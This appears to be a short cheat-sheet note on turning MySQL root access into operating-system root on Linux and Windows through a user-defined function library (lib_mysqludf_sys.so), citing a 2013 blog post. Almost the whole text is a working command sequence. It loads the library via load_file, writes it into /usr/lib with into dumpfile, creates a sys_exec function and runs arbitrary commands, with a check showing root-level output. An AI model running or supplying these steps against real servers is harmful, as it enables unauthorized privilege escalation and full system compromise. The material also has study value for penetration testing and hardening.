works on linux and windows, still need compiled lib_mysqludf_sys.so! Should be in sqlmap udf directory
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/


log into mysql to get a prompt
use a database and table

> use <DATABASE>;
> create table <USERNAME>(line blob);
> insert into robert values(load_file('/home/<USERNAME>/lib_mysqludf_sys.so'));
> select * from <USERNAME> into dumpfile '/usr/lib/lib_mysqludf_sys.so';
> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
> select sys_exec('<RUN COMMAND HERE>');

You can check to see if the commands are running by doing something like

> select sys_exec('id > /tmp/out; chown robert.robert /tmp/out');
and then doing a $ cat /tmp/out
you should see uid=0(root) gid=0(root) etc etc
